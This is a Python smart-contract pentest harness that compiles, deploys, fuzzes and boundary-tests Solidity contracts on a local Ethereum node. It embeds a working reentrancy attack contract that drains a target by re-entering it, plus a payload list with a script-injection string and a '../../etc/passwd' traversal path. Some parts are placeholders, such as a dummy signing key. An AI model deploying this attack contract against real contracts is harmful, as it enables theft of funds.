#!/usr/bin/env python3
import json
import requests
import subprocess
import time
from web3 import Web3, HTTPProvider
from web3.middleware import geth_poa_middleware
import argparse
import threading
from queue import Queue
from colorama import Fore, Style, init
import os

# Initialize colorama
init(autoreset=True)

class BlockchainPentestHarness:
    def __init__(self, rpc_url="http://localhost:8545"):
        self.w3 = Web3(HTTPProvider(rpc_url))
        
        # Add POA middleware if needed (for networks like Polygon, BSC)
        self.w3.middleware_onion.inject(geth_poa_middleware, layer=0)
        
        self.contracts = {}
        self.test_results = []
        self.attack_vectors = []
        
        # Common attack payloads
        self.payloads = {
            'overflow': ['0', '1', '2**256-1', '2**256'],
            'address': ['0x0000000000000000000000000000000000000000', 
                       '0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF'],
            'strings': ['', 'test', '<script>alert(1)</script>', '../../etc/passwd'],
            'large_inputs': ['A' * 1000, 'A' * 10000],
            'special_chars': ['\x00', '\xff', '\xfe']
        }
    
    def connect_to_network(self):
        """Connect to blockchain network"""
        if self.w3.is_connected():
            print(f"{Fore.GREEN}[+] Connected to blockchain network")
            print(f"    Network: {self.w3.net.version}")
            print(f"    Latest block: {self.w3.eth.block_number}")
            print(f"    Chain ID: {self.w3.eth.chain_id}")
            return True
        else:
            print(f"{Fore.RED}[-] Failed to connect to blockchain network")
            return False
    
    def compile_contract(self, contract_path):
        """Compile Solidity contract"""
        print(f"{Fore.CYAN}[*] Compiling contract: {contract_path}")
        
        try:
            # Use solc to compile contract
            result = subprocess.run([
                'solc', '--combined-json', 'abi,bin', contract_path
            ], capture_output=True, text=True)
            
            if result.returncode == 0:
                compilation_output = json.loads(result.stdout)
                contract_name = list(compilation_output['contracts'].keys())[0].split(':')[-1]
                contract_data = compilation_output['contracts'][list(compilation_output['contracts'].keys())[0]]
                
                self.contracts[contract_name] = {
                    'abi': json.loads(contract_data['abi']),
                    'bytecode': contract_data['bin'],
                    'path': contract_path
                }
                
                print(f"{Fore.GREEN}[+] Successfully compiled {contract_name}")
                return contract_name
            else:
                print(f"{Fore.RED}[-] Compilation failed: {result.stderr}")
                return None
                
        except Exception as e:
            print(f"{Fore.RED}[-] Compilation error: {e}")
            return None
    
    def deploy_contract(self, contract_name, deployer_account=None, constructor_args=None):
        """Deploy contract to blockchain"""
        if contract_name not in self.contracts:
            print(f"{Fore.RED}[-] Contract {contract_name} not found")
            return None
        
        try:
            contract_data = self.contracts[contract_name]
            
            # Get deployer account
            if not deployer_account:
                deployer_account = self.w3.eth.accounts[0]
            
            # Prepare contract
            contract = self.w3.eth.contract(
                abi=contract_data['abi'],
                bytecode=contract_data['bytecode']
            )
            
            # Build transaction
            if constructor_args:
                constructor = contract.constructor(*constructor_args)
            else:
                constructor = contract.constructor()
            
            transaction = constructor.build_transaction({
                'from': deployer_account,
                'nonce': self.w3.eth.get_transaction_count(deployer_account),
                'gas': 3000000,
                'gasPrice': self.w3.eth.gas_price
            })
            
            # Sign and send transaction
            signed_txn = self.w3.eth.account.sign_transaction(transaction, private_key='0x...')  # In real scenario, use proper key management
            tx_hash = self.w3.eth.send_raw_transaction(signed_txn.rawTransaction)
            
            # Wait for receipt
            receipt = self.w3.eth.wait_for_transaction_receipt(tx_hash)
            
            if receipt.status == 1:
                deployed_contract = self.w3.eth.contract(
                    address=receipt.contractAddress,
                    abi=contract_data['abi']
                )
                
                self.contracts[contract_name]['deployed'] = deployed_contract
                self.contracts[contract_name]['address'] = receipt.contractAddress
                
                print(f"{Fore.GREEN}[+] Contract deployed successfully")
                print(f"    Address: {receipt.contractAddress}")
                print(f"    Gas used: {receipt.gasUsed}")
                
                return deployed_contract
            else:
                print(f"{Fore.RED}[-] Contract deployment failed")
                return None
                
        except Exception as e:
            print(f"{Fore.RED}[-] Deployment error: {e}")
            return None
    
    def analyze_contract_functions(self, contract_name):
        """Analyze contract functions and their properties"""
        if contract_name not in self.contracts or 'deployed' not in self.contracts[contract_name]:
            print(f"{Fore.RED}[-] Contract not deployed")
            return
        
        contract = self.contracts[contract_name]['deployed']
        functions = contract.all_functions()
        
        print(f"{Fore.CYAN}[*] Analyzing contract functions:")
        
        function_analysis = []
        for func in functions:
            func_info = {
                'name': func.fn_name,
                'type': func.function_type,
                'inputs': [{'name': input.name, 'type': input.type} for input in func.abi['inputs']],
                'outputs': [{'name': output.name, 'type': output.type} for output in func.abi['outputs']],
                'state_mutability': func.abi.get('stateMutability', 'unknown'),
                'payable': func.abi.get('payable', False),
                'constant': func.abi.get('constant', False)
            }
            function_analysis.append(func_info)
            
            # Print function details
            input_str = ", ".join([f"{inp['type']} {inp['name']}" for inp in func_info['inputs']])
            print(f"    {func_info['name']}({input_str}) - {func_info['state_mutability']}")
        
        self.contracts[contract_name]['functions'] = function_analysis
        return function_analysis
    
    def fuzz_function(self, contract_name, function_name, iterations=100):
        """Fuzz test contract functions with various inputs"""
        if contract_name not in self.contracts or 'deployed' not in self.contracts[contract_name]:
            print(f"{Fore.RED}[-] Contract not deployed")
            return
        
        contract = self.contracts[contract_name]['deployed']
        function = getattr(contract.functions, function_name)
        
        print(f"{Fore.CYAN}[*] Fuzzing function: {function_name}")
        
        results = []
        for i in range(iterations):
            try:
                # Generate random inputs based on function signature
                inputs = self.generate_fuzz_inputs(function)
                
                # Call function
                if function.abi.get('stateMutability') in ['view', 'pure']:
                    # Constant function - call without transaction
                    result = function(*inputs).call()
                    results.append({
                        'iteration': i,
                        'inputs': inputs,
                        'result': result,
                        'status': 'success'
                    })
                else:
                    # State-changing function - send transaction
                    # Note: In real testing, use test accounts
                    print(f"    Would send transaction with inputs: {inputs}")
                    results.append({
                        'iteration': i,
                        'inputs': inputs,
                        'status': 'transaction_required'
                    })
                    
            except Exception as e:
                results.append({
                    'iteration': i,
                    'inputs': inputs,
                    'error': str(e),
                    'status': 'error'
                })
        
        return results
    
    def generate_fuzz_inputs(self, function):
        """Generate fuzzing inputs based on function parameters"""
        inputs = []
        
        for param in function.abi['inputs']:
            param_type = param['type']
            
            if 'uint' in param_type:
                inputs.append(self.w3.to_wei(1, 'ether'))  # 1 ETH in wei
            elif 'int' in param_type:
                inputs.append(-1)
            elif 'address' in param_type:
                inputs.append(self.w3.eth.accounts[0])
            elif 'bool' in param_type:
                inputs.append(True)
            elif 'string' in param_type or 'bytes' in param_type:
                inputs.append("fuzz_test")
            else:
                inputs.append(None)
        
        return inputs
    
    def test_reentrancy(self, contract_name, target_function):
        """Test for reentrancy vulnerability"""
        print(f"{Fore.YELLOW}[*] Testing reentrancy on {target_function}")
        
        # Deploy malicious contract that reenters
        malicious_code = '''
        pragma solidity ^0.8.0;
        
        contract ReentrancyAttack {
            address vulnerable;
            uint public attackCount;
            
            constructor(address _vulnerable) {
                vulnerable = _vulnerable;
            }
            
            function attack() public payable {
                (bool success, ) = vulnerable.call{value: msg.value}(
                    abi.encodeWithSignature("%s(uint256)", msg.value)
                );
                require(success, "Initial call failed");
            }
            
            fallback() external payable {
                if (attackCount < 5) {
                    attackCount++;
                    // Re-enter the vulnerable function
                    (bool success, ) = vulnerable.call(
                        abi.encodeWithSignature("%s(uint256)", msg.value)
                    );
                }
            }
        }
        ''' % (target_function, target_function)
        
        # Save, compile and deploy malicious contract
        with open('ReentrancyAttack.sol', 'w') as f:
            f.write(malicious_code)
        
        attack_contract_name = self.compile_contract('ReentrancyAttack.sol')
        if attack_contract_name:
            vulnerable_address = self.contracts[contract_name]['address']
            attack_contract = self.deploy_contract(attack_contract_name, constructor_args=[vulnerable_address])
            
            if attack_contract:
                self.attack_vectors.append({
                    'type': 'reentrancy',
                    'target': target_function,
                    'attack_contract': attack_contract.address,
                    'status': 'prepared'
                })
    
    def test_integer_overflow(self, contract_name, function_name):
        """Test for integer overflow/underflow vulnerabilities"""
        print(f"{Fore.YELLOW}[*] Testing integer overflow on {function_name}")
        
        contract = self.contracts[contract_name]['deployed']
        function = getattr(contract.functions, function_name)
        
        # Test boundary values
        test_values = [
            (2**256 - 1, "MAX_UINT"),
            (0, "ZERO"),
            (1, "ONE"),
            (2**255, "LARGE_VALUE")
        ]
        
        for value, description in test_values:
            try:
                result = function(value).call()
                print(f"    {description}: {value} -> {result}")
            except Exception as e:
                print(f"    {description}: {value} -> ERROR: {e}")
    
    def front_running_simulation(self, contract_name, target_function):
        """Simulate front-running attack"""
        print(f"{Fore.YELLOW}[*] Simulating front-running on {target_function}")
        
        # This simulates monitoring mempool and submitting competing transactions
        contract = self.contracts[contract_name]['deployed']
        function = getattr(contract.functions, target_function)
        
        # Monitor for transactions (simplified)
        print("    Monitoring mempool for target transactions...")
        
        # In real implementation, you would:
        # 1. Monitor pending transactions
        # 2. Detect transactions calling target_function
        # 3. Submit competing transaction with higher gas price
        
        print("    Front-running simulation complete")
    
    def interactive_test_console(self, contract_name):
        """Launch interactive testing console"""
        if contract_name not in self.contracts or 'deployed' not in self.contracts[contract_name]:
            print(f"{Fore.RED}[-] Contract not deployed")
            return
        
        print(f"{Fore.CYAN}[*] Starting interactive console for {contract_name}")
        print("    Type 'help' for available commands")
        
        contract = self.contracts[contract_name]['deployed']
        
        while True:
            try:
                command = input(f"{Fore.GREEN}pentest>{Style.RESET_ALL} ").strip().split()
                
                if not command:
                    continue
                
                if command[0] == 'exit':
                    break
                elif command[0] == 'help':
                    self.show_help()
                elif command[0] == 'functions':
                    self.list_functions(contract_name)
                elif command[0] == 'call':
                    self.call_function(contract, command[1:])
                elif command[0] == 'fuzz':
                    self.fuzz_function(contract_name, command[1])
                elif command[0] == 'test':
                    self.run_security_test(contract_name, command[1])
                elif command[0] == 'scan':
                    self.full_security_scan(contract_name)
                else:
                    print(f"Unknown command: {command[0]}")
                    
            except KeyboardInterrupt:
                break
            except Exception as e:
                print(f"Error: {e}")
    
    def show_help(self):
        """Show interactive console help"""
        commands = {
            'help': 'Show this help message',
            'exit': 'Exit the interactive console',
            'functions': 'List all contract functions',
            'call <function> [args]': 'Call a contract function',
            'fuzz <function>': 'Fuzz test a function',
            'test <vulnerability>': 'Run specific security test',
            'scan': 'Run full security scan'
        }
        
        for cmd, desc in commands.items():
            print(f"    {cmd:20} - {desc}")
    
    def list_functions(self, contract_name):
        """List all contract functions"""
        if 'functions' not in self.contracts[contract_name]:
            self.analyze_contract_functions(contract_name)
        
        for func in self.contracts[contract_name]['functions']:
            input_str = ", ".join([f"{inp['type']} {inp['name']}" for inp in func['inputs']])
            print(f"    {func['name']}({input_str})")
    
    def call_function(self, contract, args):
        """Call contract function from interactive console"""
        if not args:
            print("Usage: call <function_name> [args...]")
            return
        
        function_name = args[0]
        function_args = args[1:]
        
        try:
            function = getattr(contract.functions, function_name)
            
            # Convert arguments to appropriate types
            converted_args = []
            for i, arg in enumerate(function_args):
                # Simple type conversion - extend this for complex types
                if arg.startswith('0x'):
                    converted_args.append(arg)  # Address
                elif arg.isdigit():
                    converted_args.append(int(arg))  # Integer
                elif arg.lower() in ['true', 'false']:
                    converted_args.append(arg.lower() == 'true')  # Boolean
                else:
                    converted_args.append(arg)  # String
            
            result = function(*converted_args).call()
            print(f"Result: {result}")
            
        except Exception as e:
            print(f"Error calling function: {e}")
    
    def run_security_test(self, contract_name, test_type):
        """Run specific security test"""
        tests = {
            'reentrancy': self.test_reentrancy,
            'overflow': self.test_integer_overflow,
            'frontrun': self.front_running_simulation
        }
        
        if test_type in tests:
            # For demonstration, test first function
            functions = self.contracts[contract_name]['functions']
            if functions:
                target_function = functions[0]['name']
                tests[test_type](contract_name, target_function)
        else:
            print(f"Unknown test type: {test_type}")
            print("Available tests: reentrancy, overflow, frontrun")
    
    def full_security_scan(self, contract_name):
        """Run comprehensive security scan"""
        print(f"{Fore.CYAN}[*] Starting full security scan for {contract_name}")
        
        # Analyze functions
        functions = self.analyze_contract_functions(contract_name)
        
        # Run various security tests
        for func in functions:
            if func['state_mutability'] not in ['view', 'pure']:
                self.test_reentrancy(contract_name, func['name'])
                self.test_integer_overflow(contract_name, func['name'])
        
        self.front_running_simulation(contract_name, functions[0]['name'] if functions else 'unknown')
        
        print(f"{Fore.GREEN}[+] Security scan completed")
    
    def generate_report(self):
        """Generate penetration testing report"""
        report = {
            'timestamp': time.time(),
            'network': self.w3.net.version if self.w3.is_connected() else 'unknown',
            'contracts_tested': list(self.contracts.keys()),
            'test_results': self.test_results,
            'attack_vectors': self.attack_vectors,
            'recommendations': []
        }
        
        # Generate recommendations based on findings
        if any('reentrancy' in vec['type'] for vec in self.attack_vectors):
            report['recommendations'].append(
                "Apply checks-effects-interactions pattern to prevent reentrancy"
            )
        
        # Save report
        filename = f"blockchain_pentest_report_{int(time.time())}.json"
        with open(filename, 'w') as f:
            json.dump(report, f, indent=2)
        
        print(f"{Fore.GREEN}[+] Report saved to {filename}")
        return report

def main():
    parser = argparse.ArgumentParser(description='Blockchain Penetration Testing Harness')
    parser.add_argument('--rpc', default='http://localhost:8545', help='Ethereum RPC URL')
    parser.add_argument('--contract', help='Solidity contract file to test')
    parser.add_argument('--deploy', action='store_true', help='Deploy contract before testing')
    parser.add_argument('--interactive', action='store_true', help='Start interactive console')
    
    args = parser.parse_args()
    
    # Initialize harness
    harness = BlockchainPentestHarness(args.rpc)
    
    # Connect to network
    if not harness.connect_to_network():
        return
    
    # Load and test contract
    if args.contract:
        contract_name = harness.compile_contract(args.contract)
        
        if contract_name and args.deploy:
            harness.deploy_contract(contract_name)
            harness.analyze_contract_functions(contract_name)
            
            if args.interactive:
                harness.interactive_test_console(contract_name)
            else:
                harness.full_security_scan(contract_name)
    
    # Generate report
    harness.generate_report()

if __name__ == "__main__":
    main()
